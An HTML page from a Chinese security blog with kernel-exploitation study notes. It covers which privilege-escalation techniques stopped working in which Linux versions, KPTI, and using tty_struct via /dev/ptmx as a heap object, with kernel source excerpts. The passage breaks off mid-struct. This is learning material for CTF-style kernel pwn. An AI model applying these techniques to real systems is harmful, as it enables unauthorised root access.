<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="简单记一些东西">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel小记">
<meta property="og:url" content="https://ixout.github.io/posts/57127/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="简单记一些东西">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/wjzFeZiDUpxXVKJ.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/sD9xtpaHrQ2uneZ.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/5IcVxRaFQtg3HCW.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/AV8HsnZj2bUCl4J.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/U8CjYMBOcZ74s3W.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-04-02_213558.png">
<meta property="article:published_time" content="2024-03-22T02:22:04.000Z">
<meta property="article:modified_time" content="2024-11-20T14:11:46.256Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/wjzFeZiDUpxXVKJ.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
        
      
    
    <!-- title -->
    <title>kernel小记</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/posts/10326/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/posts/3059/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/57127/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/57127/&text=kernel小记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/57127/&is_video=false&description=kernel小记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=kernel小记&body=Check out this article: https://ixout.github.io/posts/57127/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/57127/&name=kernel小记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/57127/&t=kernel小记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E7%9B%B8%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">版本相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%97%B6"><span class="toc-number">1.1.</span> <span class="toc-text">过时</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#prepare-kernel-cred-NULL"><span class="toc-number">1.1.1.</span> <span class="toc-text">prepare_kernel_cred(NULL)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF-cred-jar"><span class="toc-number">1.1.2.</span> <span class="toc-text">UAF cred_jar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pt-regs"><span class="toc-number">1.1.3.</span> <span class="toc-text">pt_regs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#userfaultfd"><span class="toc-number">1.1.4.</span> <span class="toc-text">userfaultfd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">引入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KPTI"><span class="toc-number">1.2.1.</span> <span class="toc-text">KPTI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.</span> <span class="toc-text">结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tty-struct"><span class="toc-number">2.1.</span> <span class="toc-text">tty_struct</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seq-operations"><span class="toc-number">2.2.</span> <span class="toc-text">seq_operations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldt-struct"><span class="toc-number">2.3.</span> <span class="toc-text">ldt_struct</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#read-ldt"><span class="toc-number">2.3.1.</span> <span class="toc-text">read_ldt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E8%8C%83%E5%9B%B4%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">大范围搜索内存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-ldt"><span class="toc-number">2.3.2.</span> <span class="toc-text">write_ldt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setxattr"><span class="toc-number">2.4.</span> <span class="toc-text">setxattr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shm-file-data"><span class="toc-number">2.5.</span> <span class="toc-text">shm_file_data</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E9%85%8D"><span class="toc-number">2.5.1.</span> <span class="toc-text">分配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8A%E6%94%BE"><span class="toc-number">2.5.2.</span> <span class="toc-text">释放</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msg"><span class="toc-number">2.6.</span> <span class="toc-text">msg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pipe"><span class="toc-number">2.7.</span> <span class="toc-text">pipe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe-inode-info"><span class="toc-number">2.7.1.</span> <span class="toc-text">pipe_inode_info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe-buffer"><span class="toc-number">2.7.2.</span> <span class="toc-text">pipe_buffer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sk-buff"><span class="toc-number">2.8.</span> <span class="toc-text">sk_buff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#key"><span class="toc-number">2.9.</span> <span class="toc-text">key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#io-uring"><span class="toc-number">2.10.</span> <span class="toc-text">io_uring</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#userfaultfd-1"><span class="toc-number">3.1.</span> <span class="toc-text">userfaultfd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pgv%E9%A1%B5%E7%BA%A7%E5%88%86%E9%85%8D"><span class="toc-number">3.2.</span> <span class="toc-text">pgv页级分配</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setsockopt"><span class="toc-number">3.3.</span> <span class="toc-text">setsockopt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#modprobe-path"><span class="toc-number">3.4.</span> <span class="toc-text">modprobe_path</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gadget"><span class="toc-number">4.</span> <span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#work-for-cpu-fn"><span class="toc-number">4.1.</span> <span class="toc-text">work_for_cpu_fn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7"><span class="toc-number">5.</span> <span class="toc-text">奇技淫巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#QEMU%E9%80%83%E9%80%B8"><span class="toc-number">5.1.</span> <span class="toc-text">QEMU逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bin%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-number">5.2.</span> <span class="toc-text">bin目录不为ROOT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-number">5.3.</span> <span class="toc-text">根目录不为ROOT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E8%AE%BE%E7%BD%AE"><span class="toc-number">5.4.</span> <span class="toc-text">密码设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid"><span class="toc-number">5.5.</span> <span class="toc-text">suid</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E6%94%AF%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">linux支持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#direct-map-addr-to-from-page-addr"><span class="toc-number">6.1.</span> <span class="toc-text">direct_map_addr_to&#x2F;from_page_addr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setreuid-setregid"><span class="toc-number">6.2.</span> <span class="toc-text">setreuid&#x2F;setregid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#secondary-startup-64"><span class="toc-number">6.3.</span> <span class="toc-text">secondary_startup_64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E5%AF%B9kernelpwn%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">6.4.</span> <span class="toc-text">内存大小对kernelpwn的影响</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        kernel小记
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ixout</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-22T02:22:04.000Z" class="dt-published" itemprop="datePublished">2024-03-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/pwn/">pwn</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h1><h2 id="过时"><a href="#过时" class="headerlink" title="过时"></a>过时</h2><h3 id="prepare-kernel-cred-NULL"><a href="#prepare-kernel-cred-NULL" class="headerlink" title="prepare_kernel_cred(NULL)"></a>prepare_kernel_cred(NULL)</h3><p><strong>过时版本:6.2</strong></p>
<p>自从<strong><u>内核版本 6.2</u></strong> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，这使得这种提权方法<strong>无法再应用于 6.2 及更高版本的内核：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<h3 id="UAF-cred-jar"><a href="#UAF-cred-jar" class="headerlink" title="UAF cred_jar"></a>UAF cred_jar</h3><p><strong>过时版本:4.5</strong></p>
<p>从4.5版本开始,我们已无法直接分配到 cred_jar 中的 object<strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时(默认开启)</strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h3><p><strong>过时版本:5.13</strong></p>
<p><strong>在5.13,内核入栈时添加了一个偏移值,这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="line">index <span class="number">4</span>efd39aacb9f2.<span class="number">.7</span>b2542b13ebd9 <span class="number">100644</span></span><br><span class="line">--- a/arch/x86/entry/common.c</span><br><span class="line">+++ b/arch/x86/entry/common.c</span><br><span class="line">@@ <span class="number">-38</span>,<span class="number">6</span> +<span class="number">38</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"> __visible noinstr <span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> nr, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line"> &#123;</span><br><span class="line">+    add_random_kstack_offset();</span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure>
<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p><strong>过时版本:5.11</strong></p>
<p>在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//before</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//now:</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;</span><br></pre></td></tr></table></figure>
<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110</p>
<h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h2><p><strong>申请obj大小:1k</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:是</strong></p>
<p><strong>功能:.text泄露|直接映射区泄露|劫持流</strong></p>
<hr>
<p>打开一个 tty 设备文件时,内核最终会调用 <code>alloc_tty_struct()</code> 来分配一个 <code>tty_struct</code> 结构体</p>
<p>一般情况下,我们选择打开<code>/dev/ptmx</code>文件来<strong>分配</strong>一个<code>tty_struct</code>结构体</p>
<p>关闭该文件即可<strong>释放</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/dev/ptmx&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure>
<p>该结构体定义于 <code>include/linux/tty.h</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct tty_struct - state associated with a tty while open</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @flow.lock: lock for flow members</span></span><br><span class="line"><span class="comment"> * @flow.stopped: tty stopped/started by tty_stop/tty_start</span></span><br><span class="line"><span class="comment"> * @flow.tco_stopped: tty stopped/started by TCOOFF/TCOON ioctls (it has</span></span><br><span class="line"><span class="comment"> *              precedense over @flow.stopped)</span></span><br><span class="line"><span class="comment"> * @flow.unused: alignment for Alpha, so that no members other than @flow.* are</span></span><br><span class="line"><span class="comment"> *         modified by the same 64b word store. The @flow&#x27;s __aligned is</span></span><br><span class="line"><span class="comment"> *         there for the very same reason.</span></span><br><span class="line"><span class="comment"> * @ctrl.lock: lock for ctrl members</span></span><br><span class="line"><span class="comment"> * @ctrl.pgrp: process group of this tty (setpgrp(2))</span></span><br><span class="line"><span class="comment"> * @ctrl.session: session of this tty (setsid(2)). Writes are protected by both</span></span><br><span class="line"><span class="comment"> *          @ctrl.lock and legacy mutex, readers must use at least one of</span></span><br><span class="line"><span class="comment"> *          them.</span></span><br><span class="line"><span class="comment"> * @ctrl.pktstatus: packet mode status (bitwise OR of TIOCPKT_* constants)</span></span><br><span class="line"><span class="comment"> * @ctrl.packet: packet mode enabled</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All of the state associated with a tty while the tty is open. Persistent</span></span><br><span class="line"><span class="comment"> * storage for tty devices is referenced here as @port in struct tty_port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;<span class="comment">//掩码0x5401</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> 